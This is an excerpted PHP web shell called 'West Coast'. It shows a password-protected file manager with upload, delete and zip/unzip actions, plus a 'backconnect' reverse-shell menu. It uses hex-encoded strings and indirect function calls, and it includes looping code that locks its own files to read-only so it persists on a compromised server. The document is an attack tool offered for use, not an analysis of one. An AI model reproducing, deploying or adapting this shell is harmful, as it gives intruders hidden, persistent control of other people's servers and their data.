...
if (!isset($_SESSION['authenticated'])) {
    $stored_hashed_password = '$2y$10$eQcMjba4TWG30iP8YTu4z.0FgpQB73uRVZe3JaElkqJCb3fyZa95C';
...
function file_ext($file)
{
    if (mime_content_type($file) == 'image/png' or mime_content_type($file) == 'image/jpeg') {
        ...
        return '<i class="fa-solid fa-file-code" style="color:#14ec1f"></i>';
        ...
        return '<i class="fa-regular fa-file-code" style="color:#14ec1f"></i>';
    }
}
...
<head>
    ...
    <title>West Coast [ <?= $_SERVER['SERVER_NAME']; ?> ]</title>
...
<body>
    <div class="menu-header">
        <ul>
            ...
            <li><i class="fa-brands fa-github"></i>&nbsp;WEST COAST</li>
            <li class="logo-west-coast"><img width="250" height="250" src="https://i.imgur.com/5e15qls.png" align="right"></li>
            <form action="" method="post" enctype='<?= "\x6d\x75\x6c\x74\x69\x70\x61\x72\x74\x2f\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61"; ?>'>
                <li class="form-upload"><input type="submit" value="Upload" name="westcoast-up-submit" class="btn-submit">&nbsp;<input type="file" name="westcoast-upload" class="form-file"></li>
            </form>
        </ul>
    </div>
    ...
    <div class="menu-file-manager">
            ...
            <form action="" method="post">
                <tbody>
                    ...
                    <?php foreach ($file_manager as $_D) : ?>
                        ...
                        <?php endif; ?>
                    <?php endforeach; ?>
                    <!-- westcoast Files Manager -->
                    <?php foreach ($file_manager as $_F) : ?>
                        <?php if ($fungsi[3]($_F)) : ?>
                            <tr>
                                <td><input type="checkbox" name="check[]" value="<?= $_F ?>">&nbsp;<?= file_ext($_F) ?>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&f=<?= hx($_F); ?>" class="westcoast-files"><?= namaPanjang($_F); ?></a></td>
        ...
        <br>
        <select name="westcoast-select" class="btn-submit">
    ...
    <?php if (isset($_GET['backconnect'])) : ?>
        <div class="modal active">
            <div class="modal-container">
                ...
                <form action="" method="post">
                    <div class="modal-body">
                        <select class="bc-westcoast box-shadow" name="westcoast-bc">
...
if (isset($_POST['submit-bc'])) {
    ...
    } else if ($_POST['westcoast-bc'] == "python") {
...
while (True){
    ...
    if (westcoast_perm("' . $fungsi[0]() . '/' . $curFile . '") != 0444){
        chmod("' . $fungsi[0]() . '/' . $curFile . '", 0444);
    }
    if (westcoast_perm("' . __DIR__ . '") != 0555){
        chmod("' . __DIR__ . '", 0555);
    }
}

function westcoast_perm($flename){
...
if (isset($_POST['westcoast-up-submit'])) {
    $namaFilenya = $_FILES['westcoast-upload']['name'];
    $tmpName = $_FILES['westcoast-upload']['tmp_name'];
...
if (isset($_POST['submit-action'])) {
    $items = $_POST['check'];
    if ($_POST['westcoast-select'] == "delete") {
        foreach ($items as $it) {
    ...
    } else if ($_POST['westcoast-select'] == 'unzip') {
        foreach ($items as $it) {
            $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
            $fd = $repl . "/" . $it;
    ...
    } else if ($_POST['westcoast-select'] == 'zip') {
        foreach ($items as $it) {
            $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
            $fd = $repl . "/" . $it;
            if ($fungsi[3]($fd)) {
...
while (True){
    ...
    if (westcoast_perm("' . $fungsi[0]() . '/' . $flesName . '") != 0444){
        chmod("' . $fungsi[0]() . '/' . $flesName . '", 0444);
    } 
    if (westcoast_perm("' . $fungsi[0]() . '") != 0555){
        chmod("' . $fungsi[0]() . '", 0555);
    }
}
